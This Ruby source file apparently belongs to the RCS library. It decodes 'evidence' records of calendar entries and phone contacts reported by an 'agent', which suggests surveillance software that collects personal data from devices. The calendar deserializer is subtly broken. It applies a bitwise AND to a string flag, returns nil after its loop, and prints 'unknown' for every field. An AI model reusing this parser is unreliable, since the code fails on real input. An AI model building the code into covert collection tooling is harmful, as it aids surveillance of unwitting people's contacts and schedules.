require 'stringio'
require_relative 'trace'

require 'rcs-common/trace'

module RCS

  module Serialization
    PREFIX_MASK = 0x00FFFFFF

    def self.prefix(type, size)
      [(type << 0x18) | size].pack("L")
    end

    def self.decode_prefix(str)
      prefix = str.unpack("L").shift
      return (prefix & ~PREFIX_MASK) >> 0x18, prefix & PREFIX_MASK
    end
  end

  class CalendarSerializer
    include RCS::Tracer

    POOM_V1_0_PROTO = 0x01000000
    FLAG_RECUR = 0x80000000

    attr_reader :start_date, :end_date

    CALENDAR_TYPES = { 0x01000000 => :subject,
                       0x02000000 => :categories,
                       0x04000000 => :body,
                       0x08000000 => :recipients,
                       0x10000000 => :location}

    def unserialize(stream)
      tot_size = stream.read(4).unpack('L').shift
      version = stream.read(4).unpack('L').shift
      oid = stream.read(4).unpack('L').shift

      raise EvidenceDeserializeError.new("Invalid version") unless version == POOM_V1_0_PROTO

      content = stream.read(tot_size - 12)
      until content.empty?
        @flags = content.slice!(0, 4)
        ft_low = content.slice!(0, 4)
        ft_high = content.slice!(0, 4)
        @start_date = Time.from_filetime(ft_high, ft_low)
        trace :debug, "[CalendarSerializer] start date #{@start_date}"
        ft_low = content.slice!(0, 4)
        ft_high = content.slice!(0, 4)
        @end_date = Time.from_filetime(ft_high, ft_low)
        trace :debug, "[CalendarSerializer] end date #{@end_date}"
        @sensitivity = content.slice!(0, 4)
        @busy = content.slice!(0, 4)
        @duration = content.slice!(0, 4)
        @status = content.slice!(0, 4)

        if @flags & FLAG_RECUR
          return self if content.bytesize < 28 + 16

          type, interval, month_of_year, day_of_month, day_of_week_mask, instance, occurrences = *content.slice!(0, 28).unpack("L*")
          ft_low = content.slice!(0, 4)
          ft_high = content.slice!(0, 4)
          @pattern_start_date = Time.from_filetime(ft_high, ft_low)
          trace :debug, "[CalendarSerializer] pattern start date #{@pattern_start_date}"
          ft_low = content.slice!(0, 4)
          ft_high = content.slice!(0, 4)
          @pattern_end_date = Time.from_filetime(ft_high, ft_low)
          puts "[CalendarSerializer] pattern end date #{@pattern_end_date}"
        end

        @fields = {}
        until content.empty? do
          prefix = content.slice!(0, 4)
          type, size = Serialization.decode_prefix prefix
          trace :debug, "[CalendarSerializer] prefix #{type} #{size}"
          @fields[CALENDAR_TYPES[type]] = content.slice!(0, size).utf16le_to_utf8
          printf "%s => %s\n", CALENDAR_TYPES[type].to_s, "unknown"
        end
      end
    end

  end #CalendarSerializer

  class AddressBookSerializer
    include RCS::Tracer

    attr_reader :name, :contact, :info

    POOM_V1_0_PROTO = 0x01000000
    ADDRESSBOOK_TYPES = { 0x1 => :first_name,
                          0x2 => :last_name,
                          0x3 => :company,
                          0x4 => :business_fax_number,
                          0x5 => :department,
                          0x6 => :email_1,
                          0x7 => :mobile_phone_number,
                          0x8 => :office_location,
                          0x9 => :pager_number,
                          0xA => :business_phone_number,
                          0xB => :job_title,
                          0xC => :home_phone_number,
                          0xD => :email_2,
                          0xE => :spouse,
                          0xF => :email_3,
                          0x10 => :home_2_phone_number,
                          0x11 => :home_fax_number,
                          0x12 => :car_phone_number,
                          0x13 => :assistant_name,
                          0x14 => :assistant_phone_number,
                          0x15 => :children,
                          0x16 => :categories,
                          0x17 => :web_page,
                          0x18 => :business_2_phone_number,
                          0x19 => :radio_phone_number,
                          0x1A => :file_as,
                          0x1B => :yomi_company_name,
                          0x1C => :yomi_first_name,
                          0x1D => :yomi_last_name,
                          0x1E => :title,
                          0x1F => :middle_name,
                          0x20 => :suffix,
                          0x21 => :home_address_street,
                          0x22 => :home_address_city,
                          0x23 => :home_address_state,
                          0x24 => :home_address_postal_code,
                          0x25 => :home_address_country,
                          0x26 => :other_address_street,
                          0x27 => :other_address_city,
                          0x28 => :other_address_postal_code,
                          0x29 => :other_address_country,
                          0x2A => :business_address_street,
                          0x2B => :business_address_city,
                          0x2C => :business_address_state,
                          0x2D => :business_address_postal_code,
                          0x2E => :business_address_country,
                          0x2F => :other_address_state,
                          0x30 => :body,
                          0x31 => :birthday,
                          0x32 => :anniversary,
                          0x33 => :skype_name,
                          0x34 => :phone_numbers,
                          0x35 => :address,
                          0x36 => :notes,
                          0x37 => :unknown,
                          0x38 => :facebook_page}

    def initialize
      @fields = {}
      @poom_strings = {}
      ADDRESSBOOK_TYPES.each_pair do |k, v|
        @poom_strings[v] = v.to_s.gsub(/_/, " ").capitalize.encode('UTF-8')
      end
      @poom_strings[:unknown] = nil # when unknown, field name is given by agent
    end

    def serialize(fields)
      stream = StringIO.new
      fields.each_pair do |type, str|
        utf16le_str = str.to_utf16le_binary_null
        stream.write Serialization.prefix(ADDRESSBOOK_TYPES.invert[type], utf16le_str.bytesize)
        stream.write utf16le_str
      end
      header = [stream.pos, POOM_V1_0_PROTO, 0].pack('L*')
      return header + stream.string
    end

    def unserialize(stream)
      # discard header
      tot_size = stream.read(4).unpack("L").shift
      version = stream.read(4).unpack("L").shift
      oid = stream.read(4).unpack("L").shift

      raise EvidenceDeserializeError.new("Invalid version") unless version == POOM_V1_0_PROTO

      @fields = {}

      content = stream.read(tot_size - 12)
      #trace :debug, "[ADDRESSBOOK] TOTAL #{tot_size} got #{content.bytesize}"
      until content.empty?
        type, size = Serialization.decode_prefix content.slice!(0, 4)
        #trace :debug, "[ADDRESSBOOK] field size #{size} type #{type}"
        str = content.slice!(0, size).utf16le_to_utf8
        #trace :debug, "[ADDRESSBOOK] type #{type.to_s(16)}: #{str}"
        @fields[ADDRESSBOOK_TYPES[type]] = str
      end

      # name
      @name = ""
      @name = @fields[:first_name] if @fields.has_key? :first_name
      @name += " " + @fields[:last_name] if @fields.has_key? :last_name

      #trace :debug, "[ADDRESSBOOK] name #{@name}"

      # contact
      @contact = ""
      if @fields.has_key? :mobile_phone_number
        @contact = @fields[:mobile_phone_number]
      elsif @fields.has_key? :business_phone_number
        @contact = @fields[:business_phone_number]
      elsif @fields.has_key? :home_phone_number
        @contact = @fields[:home_phone_number]
      elsif @fields.has_key? :home_fax_number
        @contact = @fields[:home_fax_number]
      elsif @fields.has_key? :car_phone_number
        @contact = @fields[:car_phone_number]
      elsif @fields.has_key? :radio_phone_number
        @contact = @fields[:radio_phone_number]
      end

      #trace :debug, "[ADDRESSBOOK] contact #{@contact}"

      # info
      @info = ""
      omitted_fields = [:first_name, :last_name, :body, :file_as]
      @fields.each_pair do |k, v|
        next if omitted_fields.include? k
        str = @poom_strings[k]
        @info += str.nil? ? "" : "#{str}: "
        @info += v
        @info += "\n"
      end

      #trace :debug, "[ADDRESSBOOK] info #{@info}"

      return self
    end

  end # ::PoomSerializer
end # ::RCS